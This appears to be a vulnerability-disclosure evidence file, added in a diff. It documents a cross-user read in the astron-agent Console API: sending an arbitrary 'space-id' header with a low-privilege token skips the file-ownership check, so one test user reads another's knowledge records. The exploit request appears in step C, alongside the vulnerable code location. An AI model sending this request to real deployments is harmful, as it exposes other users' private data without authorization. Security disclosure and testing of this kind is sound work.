@@ -1,0 +1,45 @@
+astron-agent-poc — evidence 02 — cross-user knowledge read via the space-id header
+===================================================================================
+
+Target: local docker compose deployment of iflytek/astron-agent
+        main commit b4f8ed57460cbfb32016a4afd3fd7212987d33c3
+Route:  POST /file/list-knowledge-by-page via the Console API (console-hub)
+Users:  two ordinary test users — alice (victim, owns file id 9001)
+        and bob (attacker). bob has no grant on alice's file.
+Auth:   each caller's own valid low-privilege Console JWT (redacted here)
+
+Session record (three requests; responses summarised from the session — see
+evidence/README.md):
+
+-- A. baseline: alice reads her OWN file, no space-id header -----------------
+
+POST /file/list-knowledge-by-page
+Authorization: Bearer <alice's JWT>
+{"fileIds":[9001],"pageNo":1,"pageSize":10}
+
+-> business success for the caller's own file.
+
+-- B. control: bob reading alice's file WITHOUT the header is refused --------
+
+POST /file/list-knowledge-by-page
+Authorization: Bearer <bob's JWT>
+{"fileIds":[9001],"pageNo":1,"pageSize":10}
+
+-> denied: bob receives no knowledge records for the file alice owns. The
+   object-level check works when the header is absent.
+
+-- C. exploit: bob's SAME request with an arbitrary space-id header ----------
+
+POST /file/list-knowledge-by-page
+Authorization: Bearer <bob's JWT>
+space-id: 1
+{"fileIds":[9001],"pageNo":1,"pageSize":10}
+
+-> knowledge records for alice's file 9001 returned to bob. The header value
+   "1" is NOT alice's real space id — any value that parses as a Java Long
+   has the same effect (SpaceInfoUtil.getSpaceId() returns non-null, so
+   FileInfoV2Service.listKnowledgeByPage skips checkFileBelong,
+   FileInfoV2Service.java:903-930).
+
+The differential between B and C, with the identical caller and file id, is
+the finding. Read-only: reads of knowledge data, no writes.
